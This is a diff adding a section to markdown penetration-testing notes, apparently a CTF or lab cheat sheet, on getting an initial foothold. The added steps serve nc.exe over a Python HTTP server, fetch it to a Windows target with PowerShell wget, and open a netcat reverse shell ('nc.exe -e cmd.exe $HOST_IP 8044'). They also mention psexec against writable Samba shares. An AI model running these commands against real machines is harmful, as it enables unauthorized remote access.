@@ -25,6 +25,24 @@
 ?>
 ```
 
+> psexec: exploit writable shares on samba to get a way to authenticate to the machine
+
+## Initial Foothold
+### Reverse Shell
+#### Simple Reverse Shell
+The simplest way to get a reverse shell on the target machine is using netcat. First, we need to make sure that the target's machine has nc installed. If not, we can drop a nc.exe binary on our target machine using ```wget```. For windows machines, this binary can be found in ```usr/share/windows-binaries```.
+
+##### Getting our nc.exe binary on the target machine
+1. Start a http server on our machine in the same directory as our binary with ```python -m http.server 80```.
+2. Get our host ip using ```ifconfig```.
+3. On our target machine using powershell, we run ```wget http://$HOST_IP/nc.exe -outfile nc.exe```. Make sure you are in a directory that is writable to.
+
+##### Using netcat to get a simple reverse shell
+1. Start listening with netcat on our host machine with ```nc -lvnp 8044```.
+2. On our target machine using powershell, we run ```./nc.exe -e cmd.exe $HOST_IP 8044```
+
+```-e cmd.exe``` means execute cmd.exe as it sends it back to us.
+
 ## Post Exploitation
 ### Spawning a Stable Shell
 > This requires that you already have a reverse shell on the target machine
